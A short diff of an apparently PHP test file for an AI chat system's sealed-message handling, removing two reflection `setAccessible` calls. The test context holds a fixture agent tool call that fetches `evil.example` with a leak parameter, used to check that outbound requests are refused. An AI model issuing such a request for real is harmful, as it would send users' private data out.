@@ -202,7 +202,6 @@ $conversation->set('aic_security_level', ChatSeal::LEVEL_STANDARD);
 // them — the same exclusion a locked vault triggers — so a standard turn never
 // decrypts (never goes hot), yet still reads ordinary plaintext fields.
 $decrypt = new ReflectionMethod('ModelQueryExecutor', 'decryptSealedFields');
-$decrypt->setAccessible(true);
 $sealed_row = ['aim_conversation_message_id' => 1, 'aim_content' => 'v1.aead.' . str_repeat('x', 40),
 	'aim_content_sealed' => true, 'aim_sealed_owner_user_id' => $owner_id, 'aim_sealed_key' => 'k'];
 $plain_row  = ['aim_conversation_message_id' => 2, 'aim_content' => 'ordinary plaintext', 'aim_content_sealed' => false];
@@ -367,7 +366,6 @@ $stub_ctx = new class implements ToolContext {
 };
 
 $refuse = new ReflectionMethod('AgentLoop', 'refuseHotEgress');
-$refuse->setAccessible(true);
 $block = $refuse->invoke(null,
 	['type' => 'tool_use', 'id' => 'toolu_eg_2', 'name' => 'fetch_url',
 	 'input' => ['url' => 'https://evil.example/?d=leak']],
